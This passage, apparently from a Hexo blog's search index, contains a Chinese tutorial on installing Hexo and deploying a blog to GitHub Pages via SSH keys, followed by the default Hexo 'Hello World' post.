bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry http://registry.npm.taobao.org</span><br></pre></td></tr></tbody></table></figure><p>使用 npm 指令安装：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></tbody></table></figure><p>看看安装好了没：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># hexo -v</span></span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: linux 3.10.0-1160.31.1.el7.x86_64 CentOS Linux 7 (Core)</span><br><span class="line">node: 16.14.2</span><br><span class="line">...</span><br><span class="line">ngtcp2: 0.1.0-DEV</span><br><span class="line">nghttp3: 0.1.0-DEV</span><br></pre></td></tr></tbody></table></figure><h2 id="安装server"><a class="anchor" href="#安装server">#</a> 安装 server</h2><p>如果你想在本地预览博客的话，可以安装下。其实装不装都无所谓。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo hexo-server</span><br></pre></td></tr></tbody></table></figure><h2 id="安装推送插件"><a class="anchor" href="#安装推送插件">#</a> 安装推送插件</h2><p>这个推送插件是后面要推送到 <code>github page</code>  上要使用的插件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></tbody></table></figure><h2 id="创建博客"><a class="anchor" href="#创建博客">#</a> 创建博客</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init [你的博客名字]</span><br><span class="line"><span class="built_in">cd</span> [你的博客名字]</span><br><span class="line">npm install</span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果你已经备份过想要还原，则只需要做到这一步就已经可以了。但是如果想要推送还需要再看下面的配置 git 项。</p></blockquote><h1 id="本地预览博客"><a class="anchor" href="#本地预览博客">#</a> 本地预览博客</h1><p>上面已经生成好了基本博客，可以使用 <code>ls</code>  命令查看下是否正确生成了文件<br>下面是 hexo 博客的基本结构。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line"> ├── _config.yml <span class="comment"># 网站配置信息</span></span><br><span class="line"> ├── package.json <span class="comment"># 应用程序信息</span></span><br><span class="line"> ├── scaffolds <span class="comment"># 模板文件夹</span></span><br><span class="line"> ├── node_modules <span class="comment"># 生成博客后编译出来的文件。主要看这个是否生成成功了。</span></span><br><span class="line"> ├── <span class="built_in">source</span> <span class="comment"># 存放用户资源</span></span><br><span class="line"> |   ├── _drafts</span><br><span class="line"> |   └── _posts</span><br><span class="line"> └── themes <span class="comment"># 主题文件夹</span></span><br></pre></td></tr></tbody></table></figure><p>如果确认没什么问题便可以进行生成步骤了。</p><ol><li>测试本地生成博客</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一篇文章，注意要在blog的目录下。</span></span><br><span class="line">hexo new <span class="string">"文章名"</span></span><br><span class="line"><span class="comment"># 生成静态网页</span></span><br><span class="line">hexo g</span><br><span class="line"><span class="comment"># 打开本地服务器</span></span><br><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>此时你可以打开  <code>[博客地址]:4000</code>  来查看效果了。<br>如果确认没问题，便可以继续操作。</p><h1 id="备份还原"><a class="anchor" href="#备份还原">#</a> 备份还原</h1><p>博客部署完成后或是以后工作中难免需要更换环境，这里也简单说一下备份还原的流程。</p><h2 id="本地备份还原"><a class="anchor" href="#本地备份还原">#</a> 本地备份还原</h2><p>本地备份还原是对主要文件自行压缩拷贝后导出，然后覆盖进行还原</p><blockquote><p>需要备份的文件列表如下</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- .gitignore</span><br><span class="line">|-- _config.yml</span><br><span class="line">|-- package-lock.json</span><br><span class="line">|-- package.json</span><br><span class="line">|-- scaffolds</span><br><span class="line">|-- <span class="built_in">source</span></span><br><span class="line">`-- themes</span><br></pre></td></tr></tbody></table></figure><p>将这些文件考出来后则备份完成。</p><h2 id="可能会出现的问题"><a class="anchor" href="#可能会出现的问题">#</a> 可能会出现的问题</h2><p>如果当你完成还原，进行 <code>hexo g</code>  命令提示如下错误：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-N4RDFRJ0:/mnt/d/Program/hexo/blog<span class="comment"># npm install --save bulma-stylus</span></span><br><span class="line">npm ERR! code FETCH_ERROR</span><br><span class="line">npm ERR! errno FETCH_ERROR</span><br><span class="line">npm ERR! invalid json response body at https://registry.npmjs.org/browserslist reason: Unexpected end of JSON input</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /root/.npm/_logs/2022-08-23T09_22_43_977Z-debug.log</span><br></pre></td></tr></tbody></table></figure><p>执行这条命令即可：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean --force</span><br></pre></td></tr></tbody></table></figure><h1 id="配置远端"><a class="anchor" href="#配置远端">#</a> 配置远端</h1><p>我将博客部署到了 github 上，所以你要先去 github.com 上注册一个账户。并创建一个仓库。</p><h2 id="初始化-git"><a class="anchor" href="#初始化-git">#</a> 初始化 git</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init git</span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果提示 <code>Couldn't find an alternative telinit implementation to spawn.</code>  不用管，直接下一步。</p></blockquote><h2 id="配置-ssh"><a class="anchor" href="#配置-ssh">#</a> 配置 ssh</h2><ol><li>配置登录信息</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"你的git用户名"</span></span><br><span class="line">git config --global user.email <span class="string">"你的git登录邮箱"</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>生成 ssh keygen</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"你的git登录邮箱"</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果弹出了很多内容，直接进行一个回车跳过。</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">... // 直接回车跳过</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>复制密钥</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /root/.ssh/id_rsa.pub</span><br></pre></td></tr></tbody></table></figure><blockquote><p>将里面显示的所有内容复制。</p></blockquote><ol start="4"><li>登录 github</li></ol><ul><li>头像</li><li>Settings</li><li>SSH and GPG keys</li><li>New SSH key</li><li>将复制的内容粘贴到 Keys 框里</li><li>Add SSH key</li></ul><ol start="5"><li>测试链接是否成功</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ssh -T git@github.com</span></span><br><span class="line">Hi maxshiro! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></tbody></table></figure><h1 id="配置推送"><a class="anchor" href="#配置推送">#</a> 配置推送</h1><p>配置完 git 之后便可以配置 hexo 博客的推送地址了，下面以我的为例。</p><ol><li>首先 cd 到当前目录</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>编辑配置文件</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi _config.yml</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>移动到 deploy 天机如下内容</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    <span class="built_in">type</span>: git</span><br><span class="line">    reop: git@github.com:maxshiro/maxshiro.github.io.git <span class="comment">#这个地址可以到你的repo那里获得。</span></span><br><span class="line">    branch: main <span class="comment">#这个branch就是仓库的默认目录了。</span></span><br></pre></td></tr></tbody></table></figure><h1 id="推送博客"><a class="anchor" href="#推送博客">#</a> 推送博客</h1><p>已经测试并生成过博客了，所以可以直接推送。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清理之前生成的文件</span></span><br><span class="line">hexo clean</span><br><span class="line"><span class="comment"># 生成静态网页</span></span><br><span class="line">hexo g</span><br><span class="line"><span class="comment"># 推送到github repo</span></span><br><span class="line">hexo d</span><br></pre></td></tr></tbody></table></figure><h1 id="结语"><a class="anchor" href="#结语">#</a> 结语</h1><p>此时你已经完成了 hexo 博客的基本配置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> guide </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/ug/100353/"/>
      <url>/ug/100353/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="anchor" href="#quick-start">#</a> Quick Start</h2><h3 id="create-a-new-post"><a class="anchor" href="#create-a-new-post">#</a> Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="anchor" href="#run-server">#</a> Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="anchor" href="#generate-static-files">#</a> Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="anchor" href="#deploy-to-remote-sites">#</a> Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> helloworld </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
